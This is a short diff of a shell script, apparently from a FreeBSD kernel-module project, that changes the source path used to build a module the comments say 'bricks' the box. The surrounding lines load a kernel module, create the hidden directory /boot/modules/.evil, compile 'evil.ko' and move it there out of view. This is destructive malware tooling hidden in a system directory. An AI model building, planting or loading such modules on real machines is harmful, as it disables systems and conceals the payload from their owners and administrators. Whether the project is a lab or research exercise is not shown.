@@ -32,7 +32,7 @@ kldload "/boot/modules/$LKM_NAME"
 # create and put the LKM that "bricks" the box into a hidden directory 
 # you can later load this yourself but nothing works it with automatically
 mkdir /boot/modules/.evil
-cd unused/brick_box/
+cd extra/brick_box/
 # only run make if the file does not exist
 [ -f evil.ko ] || make
 mv evil.ko /boot/modules/.evil/
